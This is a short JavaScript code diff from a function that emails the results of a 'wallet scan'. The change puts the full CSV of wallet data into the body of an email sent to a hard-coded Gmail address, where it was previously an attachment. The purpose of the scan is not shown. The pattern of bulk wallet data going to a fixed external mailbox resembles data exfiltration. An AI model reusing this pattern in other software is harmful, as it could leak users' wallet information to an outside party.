@@ -336,16 +336,14 @@ async function sendCompleteResults(wallets, totalScanned) {
     console.log('📧 Email content length:', message.length);
     console.log('📧 CSV content length:', csvContent.length);
     
+    // Send without attachment first to test
+    const emailBody = message + '\n\n=== WALLET DATA ===\n' + csvContent;
+    
     const result = await transporter.sendMail({
       from: 'skillstakes01@gmail.com',
       to: 'skillstakes01@gmail.com',
       subject: subject,
-      text: message,
-      attachments: [{
-        filename: `wallet_scan_${totalScanned}_complete.csv`,
-        content: csvContent,
-        contentType: 'text/csv'
-      }]
+      text: emailBody
     });
     
     console.log('✅ CSV email sent successfully! Message ID:', result.messageId);
